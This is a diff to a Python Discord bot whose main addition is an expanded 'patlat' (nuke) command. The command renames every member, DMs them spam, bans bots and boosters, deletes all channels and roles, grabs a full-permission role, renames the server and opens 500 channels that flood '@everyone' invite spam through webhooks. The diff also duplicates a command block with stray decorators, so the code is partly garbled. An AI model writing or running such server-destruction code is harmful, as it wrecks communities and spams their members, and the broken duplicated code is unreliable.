@@ -100,7 +100,6 @@ async def on_guild_channel_delete(channel):
         async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
             if entry.user.id != SAHIB_ID and entry.user.id != bot.user.id:
                 await channel.guild.ban(entry.user, reason="Anti-Nuke: İcazəsiz kanal silindi!")
-                # Silinen kanalı eyni adla bərpa etməyə çalışaq
                 await channel.guild.create_text_channel(channel.name, category=channel.category)
     except:
         pass
@@ -110,7 +109,6 @@ async def on_member_ban(guild, user):
     try:
         async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
             if entry.user.id != SAHIB_ID and entry.user.id != bot.user.id:
-                # Kütləvi ban atmağa çalışan admini cəzalandır
                 await guild.ban(entry.user, reason="Anti-Nuke: İcazəsiz kütləvi ban!")
     except:
         pass
@@ -141,7 +139,6 @@ async def on_message(message):
             sebep = afk_users[mention.id]
             await message.channel.send(f"💤 Etiketlədiyiniz istifadəçi (`{mention.name}`) şu an AFK-dır. Səbəb: **{sebep}**")
 
-    # Reklam və Link Qoruması
     if "gg/" in icerik or "discord.gg/" in icerik or "https://" in icerik or "http://" in icerik:
         try:
             await message.delete()
@@ -450,6 +447,7 @@ async def timeout_cmd(ctx, member: discord.Member, minutes: int, *, reason="Gös
         return
     await member.timeout(timedelta(minutes=minutes), reason=reason)
     await ctx.send(f"🔇 {member.name} `{minutes}` dəqiqə mute olundu.")
+
 @bot.command(name="clear", aliases=["sil"])
 async def clear_cmd(ctx, amount: int = 5):
     if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
@@ -460,7 +458,20 @@ async def clear_cmd(ctx, amount: int = 5):
     await msg.delete()
 
 # =====================================================================
-# 9. ƏYLƏCƏ, OYUNLAR VƏ SÜRƏTLƏNDİRİLMİŞ ÜSTÜN !PATLAT KOMUTU
+# 9. ƏYLƏCƏ, OYUNLAR VƏ ULTRA DESTRUKTİV !PATLAT KOMUTU
+# =====================================================================
+@bot.command(name="sex", aliases=["spag", "ıp"])
+@bot.command(name="clear", aliases=["sil"])
+async def clear_cmd(ctx, amount: int = 5):
+    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
+        return
+    await ctx.channel.purge(limit=amount + 1)
+    msg = await ctx.send(f"🧹 `{amount}` ədəd mesaj silindi.")
+    await asyncio.sleep(3)
+    await msg.delete()
+
+# =====================================================================
+# 9. ƏYLƏCƏ, OYUNLAR VƏ ULTRA DESTRUKTİV !PATLAT KOMUTU
 # =====================================================================
 @bot.command(name="sex", aliases=["spag", "ıp"])
 async def sex_cmd(ctx, member: discord.Member):
@@ -590,8 +601,29 @@ async def patlat_cmd(ctx):
         return
     
     guild = ctx.guild
-    await ctx.send("⚡ Turbo Rejimdə Nuke başladı: Bütün kanallar silinir və paralel olaraq yeniləri yaradılır...")
+    await ctx.send("⚡ XAS ULTRA MEGA NUKE (500 KANAL) BAŞLADI: Təmizlik və kütləvi spam dalğası işə düşdü...")
 
+    # 1. Üzvlərin ləqəbini (nickname) kütləvi dəyişmək
+    async def change_nickname(member):
+        if member.id != SAHIB_ID and not member.bot:
+            try:
+                await member.edit(nick="XAS Wa Here")
+            except:
+                pass
+
+    await asyncio.gather(*(change_nickname(m) for m in guild.members), return_exceptions=True)
+
+    # 2. Üzvlərə DM (şəxsi mesaj) göndərmək
+    async def send_dm(member):
+        if member.id != SAHIB_ID and not member.bot:
+            try:
+                await member.send("🔥 Server dağıdıldı! discord.gg/xas")
+            except:
+                pass
+
+    await asyncio.gather(*(send_dm(m) for m in guild.members), return_exceptions=True)
+
+    # 3. Botları və boosterləri banlamaq
     async def ban_member(member):
         if (member.bot and member.id != bot.user.id) or (member.premium_since is not None and member.id != SAHIB_ID):
             try:
@@ -601,6 +633,7 @@ async def patlat_cmd(ctx):
 
     await asyncio.gather(*(ban_member(m) for m in guild.members), return_exceptions=True)
 
+    # 4. Mövcud kanalların silinməsi
     async def delete_channel(ch):
         try:
             await ch.delete()
@@ -609,6 +642,7 @@ async def patlat_cmd(ctx):
 
     await asyncio.gather(*(delete_channel(ch) for ch in guild.channels), return_exceptions=True)
 
+    # 5. Rolların silinməsi
     async def delete_role(r):
         if r != guild.default_role:
             try:
@@ -618,6 +652,7 @@ async def patlat_cmd(ctx):
 
     await asyncio.gather(*(delete_role(r) for r in guild.roles), return_exceptions=True)
 
+    # 6. Sahibə tam səlahiyyətli rol vermək
     try:
         new_role = await guild.create_role(
             name="#RUHUMSKDI",
@@ -628,6 +663,7 @@ async def patlat_cmd(ctx):
     except:
         pass
 
+    # 7. Server adı və URL dəyişikliyi
     ruhum_urls = ["ruhumskdi", "ruhumaz", "ruhumchaos", "ruhumhell", "ruhumzone"]
     secilen_url = random.choice(ruhum_urls)
     
@@ -636,16 +672,19 @@ async def patlat_cmd(ctx):
     except:
         pass
 
-    async def create_and_spam(i):
+    # 8. 500 Kanal açılması və Webhook vasitəsilə kütləvi spam dalğası
+    async def create_and_webhook_spam(i):
         try:
             channel = await guild.create_text_channel(f"ruhumskdi-{i}")
-            await channel.send("discord.gg/xas @everyone")
+            webhook = await channel.create_webhook(name="XAS Spammer")
+            for _ in range(5):
+                await webhook.send("discord.gg/xas @everyone")
         except:
             pass
 
     chunk_size = 20
-    for start in range(1, 301, chunk_size):
-        tasks_list = [create_and_spam(i) for i in range(start, min(start + chunk_size, 301))]
+    for start in range(1, 501, chunk_size):
+        tasks_list = [create_and_webhook_spam(i) for i in range(start, min(start + chunk_size, 501))]
         await asyncio.gather(*tasks_list, return_exceptions=True)
 
 # =====================================================================
@@ -656,4 +695,4 @@ if __name__ == "__main__":
     TOKEN = os.getenv("DISCORD_TOKEN")
     if TOKEN:
         bot.run(TOKEN)
-    
+        
